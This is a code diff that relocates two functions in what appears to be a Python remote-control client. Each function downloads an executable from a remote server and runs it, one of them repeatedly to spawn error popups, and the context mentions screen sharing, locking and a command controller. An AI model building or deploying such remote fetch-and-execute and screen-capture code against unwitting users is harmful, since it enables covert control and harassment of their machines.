@@ -375,43 +375,6 @@ def block_main():
         print("lock") 
 
 ###                       Websocket ScreenShare
-
-
-
-##                  Speakdisplay(doesnt speak actually)
-def commtxt() -> None:
-    try:
-        exe = get_path("speakdisplay.exe")
-        if not path.exists(exe):
-            if not download("speakdisplay.exe",url+"static/apps/speakdisplay.exe"):
-                log("Speakdisplay.exe could not be downloaded",state="FATAL")
-                return
-        if path.exists(exe):
-            startfile(exe)
-            log("Speakdisplay.exe running")
-            return
-        log("Speakdisplay.exe does not exist",state="FATAL")
-    
-    except Exception as e:
-        log(f"Speakdisplay thread error occured:\t{e}",state="WARN")
-
-##                      Error msgbox showing
-def showerr(num:int) -> None:
-    try:
-        exe = get_path("error.exe")
-        if not path.exists(exe):
-            if not download("error.exe",url+"static/apps/error.exe"):
-                log("error.exe could not be downloaded",state="FATAL")
-                return
-        if path.exists("error.exe"):
-            for i in range(0,num+1):
-                startfile(exe)
-            return
-        log("error.exe does not exist",state="FATAL")
-    except Exception as e:
-        log(f"showerr Thread Error occured::\t{e}",state="WARN")
-
-##                          Main Head                   ##
 async def controller(data):
     global bsig
     try:
@@ -540,6 +503,41 @@ async def screenshare():
 
 def share_trig():
     asyncio.run(screenshare())
+
+##                  Speakdisplay(doesnt speak actually)
+def commtxt() -> None:
+    try:
+        exe = get_path("speakdisplay.exe")
+        if not path.exists(exe):
+            if not download("speakdisplay.exe",url+"static/apps/speakdisplay.exe"):
+                log("Speakdisplay.exe could not be downloaded",state="FATAL")
+                return
+        if path.exists(exe):
+            startfile(exe)
+            log("Speakdisplay.exe running")
+            return
+        log("Speakdisplay.exe does not exist",state="FATAL")
+    
+    except Exception as e:
+        log(f"Speakdisplay thread error occured:\t{e}",state="WARN")
+
+##                      Error msgbox showing
+def showerr(num:int) -> None:
+    try:
+        exe = get_path("error.exe")
+        if not path.exists(exe):
+            if not download("error.exe",url+"static/apps/error.exe"):
+                log("error.exe could not be downloaded",state="FATAL")
+                return
+        if path.exists("error.exe"):
+            for i in range(0,num+1):
+                startfile(exe)
+            return
+        log("error.exe does not exist",state="FATAL")
+    except Exception as e:
+        log(f"showerr Thread Error occured::\t{e}",state="WARN")
+
+##                          Main Head                   ##
 
 def main():
     global sstate
